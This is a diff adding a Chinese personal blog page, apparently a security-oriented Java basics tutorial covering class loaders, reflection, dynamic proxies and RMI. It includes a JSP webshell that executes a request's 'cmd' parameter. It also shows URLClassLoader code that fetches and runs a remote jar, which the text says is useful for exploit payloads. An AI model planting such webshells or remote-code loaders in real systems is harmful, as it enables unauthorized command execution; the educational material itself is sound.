@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mayylu.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="前言需要注意的是，Java 的版本号命名规则在 JDK 9 之后发生了变化。在 JDK 9 之前，版本号采用 “1.x.x” 的格式（如 1.8.0），而从 JDK 9 开始，版本号不再带有前缀的 “1”，而是直接使用主版本号作为前缀（如 9.0.4）。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java基础">
+<meta property="og:url" content="https://mayylu.github.io/2023/08/17/java/java%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="mayylu">
+<meta property="og:description" content="前言需要注意的是，Java 的版本号命名规则在 JDK 9 之后发生了变化。在 JDK 9 之前，版本号采用 “1.x.x” 的格式（如 1.8.0），而从 JDK 9 开始，版本号不再带有前缀的 “1”，而是直接使用主版本号作为前缀（如 9.0.4）。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-16T16:20:19.000Z">
+<meta property="article:modified_time" content="2023-08-21T08:42:46.182Z">
+<meta property="article:author" content="mayylu">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://mayylu.github.io/2023/08/17/java/java%E5%9F%BA%E7%A1%80/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mayylu.github.io/2023/08/17/java/java%E5%9F%BA%E7%A1%80/","path":"2023/08/17/java/java基础/","title":"java基础"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>java基础 | mayylu</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">mayylu</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">Java 字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#classloader"><span class="nav-number">2.1.</span> <span class="nav-text">classloader</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URLClassLoader"><span class="nav-number">2.2.</span> <span class="nav-text">URLClassLoader</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">Java本地命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java-%E5%8F%8D%E5%B0%84"><span class="nav-number">4.</span> <span class="nav-text">java 反射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-number">5.</span> <span class="nav-text">Java 动态代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#javaRMI"><span class="nav-number">6.</span> <span class="nav-text">javaRMI</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mayylu</p>
+  <div class="site-description" itemprop="description">关注生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayylu.github.io/2023/08/17/java/java%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mayylu">
+      <meta itemprop="description" content="关注生活的点点滴滴">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mayylu">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          java基础
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-08-17 00:20:19" itemprop="dateCreated datePublished" datetime="2023-08-17T00:20:19+08:00">2023-08-17</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2023-08-21 16:42:46" itemprop="dateModified" datetime="2023-08-21T16:42:46+08:00">2023-08-21</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>需要注意的是，Java 的版本号命名规则在 JDK 9 之后发生了变化。在 JDK 9 之前，版本号采用 “1.x.x” 的格式（如 1.8.0），而从 JDK 9 开始，版本号不再带有前缀的 “1”，而是直接使用主版本号作为前缀（如 9.0.4）。<br> <span id="more"></span></p>
+<h2 id="Java-字节码"><a href="#Java-字节码" class="headerlink" title="Java 字节码"></a>Java 字节码</h2><p>Java也是一门<strong>编译型的语言</strong>，在运行之前需要先编译一遍，编译过后就会形成.class文件，然后运行在不同平台的JVM虚拟机中</p>
+<h3 id="classloader"><a href="#classloader" class="headerlink" title="classloader"></a>classloader</h3><p>Java类初始化的时候会调用java.lang.ClassLoader加载类字节码,AppClassLoader是默认的类加载器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射加载TestHelloWorld示例</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoader加载TestHelloWorld示例</span></span><br><span class="line"><span class="keyword">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>URLClassLoader继承了ClassLoader，URLClassLoader提供了加载远程资源的能力，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ 定义远程加载的jar路径</span><br><span class="line">            URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://anbai.io/tools/cmd.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            String cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            Class cmdClass = ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            Process process = (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="keyword">null</span>, cmd);</span><br></pre></td></tr></table></figure>
+<h2 id="Java本地命令执行"><a href="#Java本地命令执行" class="headerlink" title="Java本地命令执行"></a>Java本地命令执行</h2><p>Runtime对象可以调用exec()方法执行命令</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>))%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">    <span class="comment">//InputStream in = new ProcessBuilder(request.getParameterValues(&quot;cmd&quot;)).start().getInputStream();</span></span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out.write(<span class="string">&quot;&lt;pre&gt;&quot;</span> + <span class="keyword">new</span> String(baos.toByteArray()) + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="java-反射"><a href="#java-反射" class="headerlink" title="java 反射"></a>java 反射</h2><p>Java反射操作的是java.lang.Class对象<br>反射Runtime执行本地命令代码片段：<br><code>System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(), &quot;UTF-8&quot;));</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);<span class="comment">// 设置constructor修改权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="comment">//getMethod和getDeclaredMethod都能够获取到类成员方法，区别在于getMethod只能获取到当前类和父类的所有有权限的方法(如：public)，而getDeclaredMethod能获取到当前类的所有成员方法(不包含父类)。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream in = process.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">System.out.println(org.apache.commons.io.IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure>
+<h2 id="Java-动态代理"><a href="#Java-动态代理" class="headerlink" title="Java 动态代理"></a>Java 动态代理</h2><p>Java 动态代理是一种在运行时动态生成代理对象的机制。通过使用 Java 提供的相关 API，可以<strong>在不修改原始类的情况下</strong>创建一个代理类，该代理类<strong>可以拦截原始类的方法调用</strong>，并在方法执行前后<strong>插入额外的逻辑</strong>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(String flag)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">flag1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getflag1</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">realproxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;<span class="comment">//代理类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(method.toString().contains(<span class="string">&quot;java.lang.String&quot;</span>))&#123;<span class="comment">//method为触发方法，args为参数</span></span><br><span class="line">            System.out.println(<span class="string">&quot;方法名为： &quot;</span>+method);</span><br><span class="line">            System.out.println(<span class="string">&quot;参数为： &quot;</span>+args[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;方法名为： &quot;</span>+method);</span><br><span class="line">            System.out.println(<span class="string">&quot;没有传入参数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> realproxy();<span class="comment">//代理类对象，里面包含着具体的代理逻辑</span></span><br><span class="line"></span><br><span class="line">        flag flag = (flag) Proxy.newProxyInstance(test.class.getClassLoader(),<span class="comment">// 指定动态代理类的类加载器</span></span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;flag.class&#125;,<span class="comment">// 定义动态代理生成的类实现的接口</span></span><br><span class="line">        handler);<span class="comment">// 动态代理处理类</span></span><br><span class="line">        flag1 flag1 = (flag1) Proxy.newProxyInstance(test.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;flag1.class&#125;,handler);</span><br><span class="line"></span><br><span class="line">        flag.getflag(<span class="string">&quot;flag&quot;</span>);<span class="comment">//调用实现类中实现的接口，会触发代理类对象的invoke方法</span></span><br><span class="line">        flag1.getflag1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="javaRMI"><a href="#javaRMI" class="headerlink" title="javaRMI"></a>javaRMI</h2><p>Java RMI（Remote Method Invocation）是Java提供的一种远程方法调用机制。它允许在分布式系统中的不同Java虚拟机（JVM）之间进行方法调用。<br>服务端：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义接口：首先，需要定义一个包含需要在远程系统上调用的方法的接口。这个接口中的方法称为远程接口。</span></span><br><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实现类：然后，编写一个实现远程接口的类。这个类是服务端的实现，它实现了远程接口定义的方法。</span></span><br><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">eviltest</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">eviltest</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span>  <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiserver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);<span class="comment">// 注册RMI端口</span></span><br><span class="line">        evil evil = <span class="keyword">new</span> eviltest();</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1089/evil&quot;</span>, evil);<span class="comment">//服务端需要将实现类注册到RMI注册表中，以便客户端能够找到它</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>客户端调用服务端接口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiclienr</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        evil evil = (evil) Naming.lookup(<span class="string">&quot;rmi://10.24.38.47:1089/evil&quot;</span>);</span><br><span class="line">        evil.evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>需要注意的是，Java RMI使用了Java序列化机制来将参数和返回值在客户端和服务端之间进行传输。因此，被传输的对象需要实现Serializable接口，或者使用其他可序列化的方式。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/06/13/c%20sharp/c%20sharp%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C%E5%92%8C%E5%B9%B6%E5%8F%91%E6%93%8D%E4%BD%9C/" rel="prev" title="c# 异步操作和并发操作">
+                  <i class="fa fa-chevron-left"></i> c# 异步操作和并发操作
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/08/17/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="java反序列化">
+                  java反序列化 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mayylu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
